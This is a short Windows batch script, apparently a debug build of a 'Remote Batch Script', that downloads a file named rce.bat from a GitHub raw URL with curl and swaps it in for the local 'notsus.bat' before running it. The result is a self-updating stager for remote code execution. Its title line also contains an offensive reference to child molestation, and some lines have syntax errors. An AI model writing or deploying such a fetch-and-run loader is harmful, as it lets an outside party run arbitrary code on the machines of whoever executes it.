::RBS v0.3 - DEBUG
@echo off

set "title_tag"="Discord Nitro Enjoyer's and Child Moelester's Remote Batch Script - DEBUG"
title %title_tag%

if defined UPDATED (
del temp.bat
set update_state=done
)

set EXECFile=notsus.bat
if not exist c:\Users\Public\skipupdate.dat (goto :check)

:connFailed

if defined update_state (
echo Update completed successfully!
) else (
echo Update skipped or failed!
)
pause
exit

:check
curl -s -o rce.bat --ssl-no-revoke "https://raw.githubusercontent.com/NajdzrBalls/notsus/main/F/rce.bat"
set /p GHVer=<rce.bat
set /p LOVer=<%EXECFile%
if %GHVer%==%LOVer% (
echo Newest version!
set update_state=done
) else (
if not "GHVer"="" (
echo Not newest!
echo del %EXECFile%>temp.bat
echo rename rce.bat %EXECFile%>>temp.bat
echo set UPDATED=True>>temp.bat
echo call %EXECFile%>>temp.bat
call temp.bat
) else (
echo Connection failed!
goto :connFailed
)
)
